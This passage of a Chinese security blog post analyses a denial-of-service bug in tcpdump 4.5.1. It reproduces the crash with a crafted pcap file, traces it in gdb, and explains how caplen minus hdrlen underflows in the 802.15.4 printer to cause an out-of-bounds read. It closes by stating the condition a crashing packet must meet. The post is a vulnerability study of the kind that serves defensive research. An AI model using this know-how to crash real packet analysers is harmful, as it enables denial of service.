+<h5 id="0x13-crash文件"><a href="#0x13-crash文件" class="headerlink" title="0x13 crash文件"></a>0x13 crash文件</h5><p>用winhex看一看这个crash文件</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714161151520.png" alt="image-20210714161151520"></p>
+<p>对应pcap文件</p>
+<h4 id="0x2-漏洞复现"><a href="#0x2-漏洞复现" class="headerlink" title="0x2 漏洞复现"></a>0x2 漏洞复现</h4><h6 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h6><p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163355396.png" alt="image-20210714163355396"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -r crash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163544925.png" alt="image-20210714163544925"></p>
+<p>发生段错误。</p>
+<h6 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h6><p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714164206440.png" alt="image-20210714164206440"></p>
+<h4 id="0x3-漏洞分析"><a href="#0x3-漏洞分析" class="headerlink" title="0x3 漏洞分析"></a>0x3 漏洞分析</h4><h5 id="0x31-跟踪调试"><a href="#0x31-跟踪调试" class="headerlink" title="0x31 跟踪调试"></a>0x31 跟踪调试</h5><h6 id="安装gdb及常用插件peda-pwndbg"><a href="#安装gdb及常用插件peda-pwndbg" class="headerlink" title="安装gdb及常用插件peda/pwndbg"></a>安装gdb及常用插件peda/pwndbg</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install gdb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714163905628.png" alt="image-20210714163905628"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;longld&#x2F;peda.git ~&#x2F;peda</span><br><span class="line">echo &quot;source ~&#x2F;peda&#x2F;peda.py&quot;&gt;&gt; ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714165900100.png" alt="image-20210714165900100"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714165918843.png" alt="image-20210714165918843"></p>
+<h6 id="跟踪调试"><a href="#跟踪调试" class="headerlink" title="跟踪调试"></a>跟踪调试</h6><p><strong>用gdb打开</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb tcpdump</span><br><span class="line">gdb-peda$run -r crash文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170212005.png" alt="image-20210714170212005"></p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170252515.png" alt="image-20210714170252515"></p>
+<p>运行后可以看到寄存器信息等：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170640606.png" alt="image-20210714170640606"></p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714170801622.png" alt="image-20210714170801622"></p>
+<p>可以得知发生错误的原因：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error: Cannot access memory at address 0x5555557f7000</span><br><span class="line">#无法访问地址 0x5555557f7000 处的内存</span><br></pre></td></tr></table></figure>
+
+<p>即访问了不可访问的地址而导致的程序崩溃</p>
+<p>位置在print_ascii.c文件中的91行</p>
+<p><strong>使用bt语句查看函数调用栈：</strong></p>
+<p>bt:显示所有的函数调用栈帧的信息，每个帧一行。</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714171537759.png" alt="image-20210714171537759"></p>
+<p>可以看到函数调用以及所在的文件情况：</p>
+<table>
+<thead>
+<tr>
+<th>文件位置</th>
+<th>函数名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>libc-start.c:308</td>
+<td>__libc_start_main</td>
+</tr>
+<tr>
+<td>tcpdump.c:1569</td>
+<td>main</td>
+</tr>
+<tr>
+<td>pcap.c:849</td>
+<td>pcap_loop</td>
+</tr>
+<tr>
+<td>savefile.c:409</td>
+<td>pcap_offline_read</td>
+</tr>
+<tr>
+<td>tcpdump.c:1950</td>
+<td>print_packet</td>
+</tr>
+<tr>
+<td>print-802_15_4.c:180</td>
+<td>ieee802_15_4_if_print</td>
+</tr>
+<tr>
+<td>print-ascii.c:91</td>
+<td>hex_and_ascii_print_with_offset</td>
+</tr>
+</tbody></table>
+<p>接下来去tcpdump和libpcap的文件夹中取得上述文件，查看源码：</p>
+<p>tcpdump.c:1569：调用了pcap_loop</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714181754004.png" alt="image-20210714181754004"></p>
+<p>pcap.c:849：pcap_loop函数，调用了pcap_offline_read</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714181831537.png" alt="image-20210714181831537"></p>
+<p>savefile.c:409:pcap_offline_read函数：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210714182139084.png" alt="image-20210714182139084"></p>
+<p>这里面有一个callback，根据函数调用栈可以知道是调用了print_packet</p>
+<p>tcpdump中的print_packet函数中，这里调用了ieee802_15_4_if_print</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170515455.png" alt="image-20210715170515455"></p>
+<p>在print-802_15_4的ieee802_15_4_if_print函数中，调用了ndo_default_print：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170602361.png" alt="image-20210715170602361"></p>
+<p>通过搜索这个函数，我们可以看到里面调用了hex_and_ascii_print：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715171350065.png" alt="image-20210715171350065"></p>
+<p>hex_and_ascii_print直接调用了hex_and_ascii_print_with_offset：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715171624113.png" alt="image-20210715171624113"></p>
+<p>函数在print-ascii中：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715170659670.png" alt="image-20210715170659670"></p>
+<p>根据while，知道这是一个循环，就可以猜测原因大概是因为循环，s2越界访问了</p>
+<p>可以看出循环与nshorts有关，根据86行代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nshorts &#x3D; length &#x2F; sizeof(u_short);</span><br></pre></td></tr></table></figure>
+
+<p>得知与length有关</p>
+<p>一路向上寻找传入的length参数，根据以下调用：length就是caplen</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ndo-&gt;ndo_default_print)(ndo, p, caplen);</span><br></pre></td></tr></table></figure>
+
+<p>结合gdb单步调试和源码分析ieee802_15_4_if_print函数：</p>
+<p>给ieee802_15_4_if_print函数下断点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b ieee802_15_4_if_print</span><br><span class="line">run -r crash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715180222023.png" alt="image-20210715180222023"></p>
+<p>然后s进入，可以继续单步n调试</p>
+<p>查看变量此时的值：</p>
+<p><img src="/2021/07/16/tcpdump4-5-1%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20210715181224711.png" alt="image-20210715181224711"></p>
+<p>ieee802_15_4_if_print函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">ieee802_15_4_if_print(struct netdissect_options *ndo,</span><br><span class="line">                      const struct pcap_pkthdr *h, const u_char *p)</span><br><span class="line">&#123;</span><br><span class="line">	u_int caplen &#x3D; h-&gt;caplen;</span><br><span class="line">	int hdrlen;</span><br><span class="line">	u_int16_t fc;</span><br><span class="line">	u_int8_t seq;</span><br><span class="line"></span><br><span class="line">	if (caplen &lt; 3) &#123;&#x2F;&#x2F;n步第一次，caplen &#x3D; 0x8</span><br><span class="line">		ND_PRINT((ndo, &quot;[|802.15.4] %x&quot;, caplen));</span><br><span class="line">		return caplen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fc &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">	hdrlen &#x3D; extract_header_length(fc);&#x2F;&#x2F;n步第二次，fc &#x3D; 0xff40</span><br><span class="line"></span><br><span class="line">	seq &#x3D; EXTRACT_LE_8BITS(p + 2);</span><br><span class="line"></span><br><span class="line">	p +&#x3D; 3;&#x2F;&#x2F;n步第三次，hdrlen &#x3D; 0x12</span><br><span class="line">	caplen -&#x3D; 3;&#x2F;&#x2F;n步第三次</span><br><span class="line"></span><br><span class="line">	ND_PRINT((ndo,&quot;IEEE 802.15.4 %s packet &quot;, ftypes[fc &amp; 0x7]));&#x2F;&#x2F;n步第四次，caplen &#x3D; 0x5</span><br><span class="line">	if (vflag)&#x2F;&#x2F;n步第五次</span><br><span class="line">		ND_PRINT((ndo,&quot;seq %02x &quot;, seq));</span><br><span class="line">	if (hdrlen &#x3D;&#x3D; -1) &#123;</span><br><span class="line">		ND_PRINT((ndo,&quot;malformed! &quot;));</span><br><span class="line">		return caplen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	if (!vflag) &#123;</span><br><span class="line">		p+&#x3D; hdrlen;&#x2F;&#x2F;n步第六次</span><br><span class="line">		caplen -&#x3D; hdrlen;&#x2F;&#x2F;n步第七次，caplen和hdrlen做了运算</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		u_int16_t panid &#x3D; 0;</span><br><span class="line"></span><br><span class="line">		switch ((fc &gt;&gt; 10) &amp; 0x3) &#123;</span><br><span class="line">		case 0x00:</span><br><span class="line">			ND_PRINT((ndo,&quot;none &quot;));</span><br><span class="line">			break;</span><br><span class="line">		case 0x01:</span><br><span class="line">			ND_PRINT((ndo,&quot;reserved destination addressing mode&quot;));</span><br><span class="line">			return 0;</span><br><span class="line">		case 0x02:</span><br><span class="line">			panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			ND_PRINT((ndo,&quot;%04x:%04x &quot;, panid, EXTRACT_LE_16BITS(p)));</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			break;</span><br><span class="line">		case 0x03:</span><br><span class="line">			panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			ND_PRINT((ndo,&quot;%04x:%s &quot;, panid, le64addr_string(p)));</span><br><span class="line">			p +&#x3D; 8;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">		ND_PRINT((ndo,&quot;&lt; &quot;);</span><br><span class="line"></span><br><span class="line">		switch ((fc &gt;&gt; 14) &amp; 0x3) &#123;</span><br><span class="line">		case 0x00:</span><br><span class="line">			ND_PRINT((ndo,&quot;none &quot;));</span><br><span class="line">			break;</span><br><span class="line">		case 0x01:</span><br><span class="line">			ND_PRINT((ndo,&quot;reserved source addressing mode&quot;));</span><br><span class="line">			return 0;</span><br><span class="line">		case 0x02:</span><br><span class="line">			if (!(fc &amp; (1 &lt;&lt; 6))) &#123;</span><br><span class="line">				panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">				p +&#x3D; 2;</span><br><span class="line">			&#125;</span><br><span class="line">			ND_PRINT((ndo,&quot;%04x:%04x &quot;, panid, EXTRACT_LE_16BITS(p)));</span><br><span class="line">			p +&#x3D; 2;</span><br><span class="line">			break;</span><br><span class="line">		case 0x03:</span><br><span class="line">			if (!(fc &amp; (1 &lt;&lt; 6))) &#123;</span><br><span class="line">				panid &#x3D; EXTRACT_LE_16BITS(p);</span><br><span class="line">				p +&#x3D; 2;</span><br><span class="line">			&#125;</span><br><span class="line">                        ND_PRINT((ndo,&quot;%04x:%s &quot;, panid, le64addr_string(p))));</span><br><span class="line">			p +&#x3D; 8;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		caplen -&#x3D; hdrlen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (!suppress_default_print)&#x2F;&#x2F;n步第八次，此时caplen&#x3D;0xfffffff3</span><br><span class="line">		(ndo-&gt;ndo_default_print)(ndo, p, caplen);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>而0xfffffff3=-13</p>
+<p>作为length传入之后，可以得到nshorts为‭7FFFFFF9‬（0xfffffff3/2）</p>
+<p>变成了一个极大的值，而数据包并没有这么大，因此最终访问到未授权的内存地址。</p>
+<p>所以这个漏洞就是因为tcpdump会根据caplen长度去读取保存在内存空间数据包的内容，当引用到不可读取内存位置时，造成拒绝服务漏洞。</p>
+<h5 id="0x32-poc"><a href="#0x32-poc" class="headerlink" title="0x32 poc"></a>0x32 poc</h5><p>caplen是由于做了caplen -= hdrlen;操作变成了负数，才导致了后续nshorts变成极大的值</p>
+<p>因此只要我们的caplen-hdrlen是负数就可以了，这样的包就会引发漏洞</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/tcpdump/" rel="tag"><i class="fa fa-tag"></i> tcpdump</a>
+              <a href="/tags/gdb/" rel="tag"><i class="fa fa-tag"></i> gdb</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/07/08/python%E5%B0%8F%E8%84%9A%E6%9C%AC%E5%90%88%E9%9B%86/" rel="prev" title="python小脚本合集">
+      <i class="fa fa-chevron-left"></i> python小脚本合集
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/08/19/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" rel="next" title="CVE-2021-24086 Windows TCP/IP 拒绝服务漏洞复现分析">
+      CVE-2021-24086 Windows TCP/IP 拒绝服务漏洞复现分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x0-%E5%89%8D%E8%A8%80"><span class="nav-text">0x0 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="nav-text">0x01 前置知识：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#pcap%E5%8C%85%E6%A0%BC%E5%BC%8F"><span class="nav-text">pcap包格式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">0x1 环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x11-tcpdump%E5%AE%89%E8%A3%85"><span class="nav-text">0x11 tcpdump安装</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96"><span class="nav-text">安装依赖</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%89%E8%A3%85libpcap"><span class="nav-text">安装libpcap</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%89%E8%A3%85tcpdump"><span class="nav-text">安装tcpdump</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x12-poc"><span class="nav-text">0x12 poc</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x13-crash%E6%96%87%E4%BB%B6"><span class="nav-text">0x13 crash文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x2-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">0x2 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#tcpdump"><span class="nav-text">tcpdump</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#wireshark"><span class="nav-text">wireshark</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">0x3 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x31-%E8%B7%9F%E8%B8%AA%E8%B0%83%E8%AF%95"><span class="nav-text">0x31 跟踪调试</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%89%E8%A3%85gdb%E5%8F%8A%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6peda-pwndbg"><span class="nav-text">安装gdb及常用插件peda&#x2F;pwndbg</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%B7%9F%E8%B8%AA%E8%B0%83%E8%AF%95"><span class="nav-text">跟踪调试</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x32-poc"><span class="nav-text">0x32 poc</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="0xkami"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">0xkami</p>
+  <div class="site-description" itemprop="description">If you want me,satisfy me</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">37</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://yoloyolo.top/blog/" title="https:&#x2F;&#x2F;yoloyolo.top&#x2F;blog&#x2F;" rel="noopener" target="_blank">yoloyolo</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.harvey-blog.com/" title="http:&#x2F;&#x2F;www.harvey-blog.com" rel="noopener" target="_blank">Harveysn0w·北极熊</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://l3t1tb3.xyz/" title="http:&#x2F;&#x2F;l3t1tb3.xyz&#x2F;" rel="noopener" target="_blank">l3t1tb3</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="/risks255.github.io" title="risks255.github.io">risks</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://belyenochi.github.io/" title="https:&#x2F;&#x2F;belyenochi.github.io&#x2F;" rel="noopener" target="_blank">belyenochi</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://nooothing.top/archives/" title="http:&#x2F;&#x2F;nooothing.top&#x2F;archives&#x2F;" rel="noopener" target="_blank">nothing</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0xkami</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
